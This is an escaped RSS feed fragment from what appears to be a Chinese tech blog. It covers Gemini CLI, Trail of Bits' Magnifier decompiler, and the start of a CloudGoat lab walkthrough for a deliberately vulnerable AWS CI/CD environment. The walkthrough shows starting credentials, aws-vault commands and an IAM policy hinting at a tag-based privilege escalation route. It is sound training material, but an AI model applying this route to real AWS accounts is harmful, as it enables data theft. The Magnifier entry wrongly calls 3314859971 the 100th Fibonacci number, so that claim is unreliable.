&lt;li&gt;&lt;strong&gt;可扩展架构&lt;/strong&gt;：通过Model Context Protocol集成自定义工具&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;典型技术场景&#34;&gt;典型技术场景
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 示例：自动分析Python性能瓶颈&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;gemini&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;分析当前目录下*.py文件的CPU密集型函数，建议优化方案&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;技术资源&#34;&gt;技术资源
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/google/gemini-cli&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;GitHub仓库&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://ai.google.dev/gemini-cli&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;模型协议文档&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://makersuite.google.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;性能白皮书&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;该工具标志着命令行界面进入AI-Native时代，其代码理解深度和系统级操作能力正在重塑开发范式。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>Magnifier：交互式反编译的实验性工具</title>
        <link>http://localhost:1313/p/magnifier%E4%BA%A4%E4%BA%92%E5%BC%8F%E5%8F%8D%E7%BC%96%E8%AF%91%E7%9A%84%E5%AE%9E%E9%AA%8C%E6%80%A7%E5%B7%A5%E5%85%B7/</link>
        <pubDate>Sat, 02 Aug 2025 17:43:34 +0800</pubDate>
        
        <guid>http://localhost:1313/p/magnifier%E4%BA%A4%E4%BA%92%E5%BC%8F%E5%8F%8D%E7%BC%96%E8%AF%91%E7%9A%84%E5%AE%9E%E9%AA%8C%E6%80%A7%E5%B7%A5%E5%85%B7/</guid>
        <description>&lt;h3 id=&#34;trail-of-bits的反编译技术栈&#34;&gt;Trail of Bits的反编译技术栈
&lt;/h3&gt;&lt;p&gt;Trail of Bits正在开发多个与程序反编译相关的开源项目：Remill、Anvill、Rellic以及新推出的Magnifier。其技术策略是通过多级中间表示（IR）逐步提升编译程序：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Remill&lt;/strong&gt;：将机器指令转换为LLVM IR&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Anvill&lt;/strong&gt;：把机器码函数转化为LLVM函数&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Rellic&lt;/strong&gt;：通过Clang AST将LLVM IR转换为C代码&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Magnifier创新性地实现了在任意管道阶段进行交互式转换，研究人员可以实时操作Anvill的LLVM IR并查看Rellic生成的C代码。&lt;/p&gt;
&lt;h3 id=&#34;从repl起步的原型&#34;&gt;从REPL起步的原型
&lt;/h3&gt;&lt;p&gt;Magnifier最初作为命令行REPL（读取-求值-输出循环）开发，支持以下核心转换操作：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用LLVM优化函数&lt;/li&gt;
&lt;li&gt;函数内联&lt;/li&gt;
&lt;li&gt;带/不带常量折叠的值替换&lt;/li&gt;
&lt;li&gt;函数指针去虚拟化&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;关键技术实现包括：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;唯一标识系统&lt;/strong&gt;：为所有函数、参数、基本块和IR指令分配不透明ID&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;指令溯源机制&lt;/strong&gt;：通过&amp;quot;当前ID|源ID&amp;quot;的双重标识追踪转换过程&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;通用替换接口&lt;/strong&gt;：允许用户监控、允许或拒绝每个替换步骤&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;可视化界面magnifierui&#34;&gt;可视化界面MagnifierUI
&lt;/h3&gt;&lt;p&gt;基于Vue.js前端和C++后端的MagnifierUI具有以下特性：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;多会话WebSocket通信架构&lt;/li&gt;
&lt;li&gt;并列显示LLVM IR与Rellic生成的C代码&lt;/li&gt;
&lt;li&gt;支持指令级高亮关联&lt;/li&gt;
&lt;li&gt;集成优化按钮调用LLVM全套优化&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;典型工作流示例：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;上传二进制文件&lt;/li&gt;
&lt;li&gt;在终端视图执行参数值替换&lt;/li&gt;
&lt;li&gt;实时观察IR和C代码同步更新&lt;/li&gt;
&lt;li&gt;通过内联按钮优化函数调用&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;llvm优化的实战演示&#34;&gt;LLVM优化的实战演示
&lt;/h3&gt;&lt;p&gt;通过&amp;quot;fibIter(100)&amp;ldquo;案例展示Magnifier的威力：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;内联fibIter函数调用&lt;/li&gt;
&lt;li&gt;执行LLVM优化&lt;/li&gt;
&lt;li&gt;直接获得结果值3314859971（第100个斐波那契数）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;该过程避免了动态调试的复杂性，展示了如何将含循环/条件语句的复杂函数简化为常量。&lt;/p&gt;
&lt;h3 id=&#34;未来发展方向&#34;&gt;未来发展方向
&lt;/h3&gt;&lt;p&gt;项目规划包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;扩展转换类型支持（最终实现完整补丁集）&lt;/li&gt;
&lt;li&gt;集成Anvill直接解析二进制文件&lt;/li&gt;
&lt;li&gt;增强可视化界面的交互功能&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Magnifier通过创新的交互式反编译方法，正在重新定义逆向工程的研究范式。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>构建易受攻击的AWS DevOps环境作为CloudGoat场景</title>
        <link>http://localhost:1313/p/%E6%9E%84%E5%BB%BA%E6%98%93%E5%8F%97%E6%94%BB%E5%87%BB%E7%9A%84aws-devops%E7%8E%AF%E5%A2%83%E4%BD%9C%E4%B8%BAcloudgoat%E5%9C%BA%E6%99%AF/</link>
        <pubDate>Sat, 02 Aug 2025 17:27:26 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%9E%84%E5%BB%BA%E6%98%93%E5%8F%97%E6%94%BB%E5%87%BB%E7%9A%84aws-devops%E7%8E%AF%E5%A2%83%E4%BD%9C%E4%B8%BAcloudgoat%E5%9C%BA%E6%99%AF/</guid>
        <description>&lt;h1 id=&#34;构建易受攻击的aws-devops环境作为cloudgoat场景&#34;&gt;构建易受攻击的AWS DevOps环境作为CloudGoat场景
&lt;/h1&gt;&lt;p&gt;我是可丢弃安全实验室的忠实粉丝，无论是用于攻击还是防御目的（参见：在Azure中自动化配置Active Directory实验室）。在撰写《云安全漏洞与破坏：2021年回顾》之后，我想构建一个&amp;quot;故意设计为易受攻击的AWS实验室&amp;quot;，包含典型的攻击路径，包括静态、长期有效的凭证和供应链安全元素。&lt;/p&gt;
&lt;h2 id=&#34;cloudgoat易受攻击的aws环境&#34;&gt;CloudGoat：易受攻击的AWS环境
&lt;/h2&gt;&lt;p&gt;CloudGoat是一个开源项目，包含一系列易受攻击的AWS环境，可以使用Python封装的Terraform在您自己的AWS账户中轻松创建。每个场景都有一个专用文件夹，包含其描述和解决方案。&lt;/p&gt;
&lt;h3 id=&#34;示例cloudgoat场景&#34;&gt;示例CloudGoat场景
&lt;/h3&gt;&lt;p&gt;例如，您可以使用以下命令在AWS账户中启动&lt;code&gt;cicd&lt;/code&gt;场景：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python cloudgoat.py create cicd
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;此命令将运行Terraform来启动基础设施，并显示开始使用的说明。通常，它会输出一组AWS凭证作为起点。&lt;/p&gt;
&lt;h2 id=&#34;贡献新的cloudgoat场景&#34;&gt;贡献新的CloudGoat场景
&lt;/h2&gt;&lt;p&gt;直接链接：https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/scenarios/cicd&lt;/p&gt;
&lt;h3 id=&#34;场景故事&#34;&gt;场景故事
&lt;/h3&gt;&lt;p&gt;FooCorp是一家提供公共API的公司。FooCorp的客户每分钟都会向以下API端点提交敏感数据：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;POST {apiUrl}/prod/hello
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host: {apiHost}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Type: text/html
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;superSecretData=...
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;该API实现为一个Lambda函数，通过API Gateway公开。由于FooCorp实施了DevOps，它有一个持续部署管道，可以在几分钟内自动将Lambda函数的新版本从源代码部署到生产环境。&lt;/p&gt;
&lt;p&gt;您的任务（如果您选择接受）：您将获得一个初始的低权限IAM用户的AWS凭证集。您的目标是窃取提交给FooCorp API的敏感数据。请注意，模拟用户活动正在账户中进行，模拟对FooCorp API的活动。这是通过每分钟运行的AWS CodeBuild项目实现的。&lt;/p&gt;
&lt;p&gt;该场景包含：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;3个IAM用户&lt;/li&gt;
&lt;li&gt;1个VPC，其中包含一个位于私有子网中的EC2实例&lt;/li&gt;
&lt;li&gt;用于实现API的组件：
&lt;ul&gt;
&lt;li&gt;1个API Gateway&lt;/li&gt;
&lt;li&gt;1个Lambda函数&lt;/li&gt;
&lt;li&gt;1个ECR仓库&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;用于实现持续部署管道的组件：
&lt;ul&gt;
&lt;li&gt;1个CodePipeline管道&lt;/li&gt;
&lt;li&gt;2个CodeBuild项目&lt;/li&gt;
&lt;li&gt;1个CodeCommit仓库&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;foocorp基础设施架构图&#34;&gt;FooCorp基础设施架构图
&lt;/h3&gt;&lt;h3 id=&#34;漏洞利用步骤&#34;&gt;漏洞利用步骤
&lt;/h3&gt;&lt;p&gt;本节包含剧透！只有当您卡住了，或者不打算挑战该场景时才应阅读。点击此处跳过本节继续阅读：使用端到端测试进行持续测试&lt;/p&gt;
&lt;p&gt;当我们通过&lt;code&gt;python3 cloudgoat.py create cicd&lt;/code&gt;实例化场景时，会获得一个初始的AWS IAM访问密钥：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[cloudgoat] terraform apply completed with no error code.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[cloudgoat] terraform output completed with no error code.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cloudgoat_output_access_key_id = AKIA254BBSG...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cloudgoat_output_api_url = https://4ybsnrwee1.execute-api.us-east-1.amazonaws.com/prod
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cloudgoat_output_aws_account_id = 012345678912
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cloudgoat_output_secret_access_key = mjV9uB....
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;我们可以设置&lt;code&gt;AWS_ACCESS_KEY_ID&lt;/code&gt;和&lt;code&gt;AWS_SECRET_ACCESS_KEY&lt;/code&gt;环境变量，或使用&lt;code&gt;aws-vault&lt;/code&gt;。我更喜欢后者，因为它可以方便地同时使用CLI和AWS控制台。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ aws-vault add cloudgoat-step1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Enter Access Key ID:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Enter Secret Access Key:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Added credentials to profile &lt;span class=&#34;s2&#34;&gt;&amp;#34;cloudgoat-step1&amp;#34;&lt;/span&gt; in vault
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 使用CLI&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ aws-vault &lt;span class=&#34;nb&#34;&gt;exec&lt;/span&gt; cloudgoat-step1 --no-session
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 打开AWS控制台&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ aws-vault login cloudgoat-step1 --no-session
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;我们以名为&lt;code&gt;ec2-sandbox-manager&lt;/code&gt;的用户身份进行身份验证，该用户有一个IAM策略，允许我们管理标记为&lt;code&gt;Environment=dev&lt;/code&gt;的EC2实例的标签，并对标记为&lt;code&gt;Environment=sandbox&lt;/code&gt;的实例执行任何SSM操作。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;#34;Effect&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Allow&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;#34;Resource&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;*&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;#34;Action&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;ec2:CreateTags&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;ec2:DeleteTags&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;#34;Condition&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;#34;StringLike&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nt&#34;&gt;&amp;#34;ec2:ResourceTag/Environment&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;dev&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;#34;Effect&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Allow&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;#34;Resource&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;*&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;#34;Action&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ssm:*&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;#34;Condition&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;#34;StringLike&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nt&#34;&gt;&amp;#34;ssm:ResourceTag/Environment&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;sandbox&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
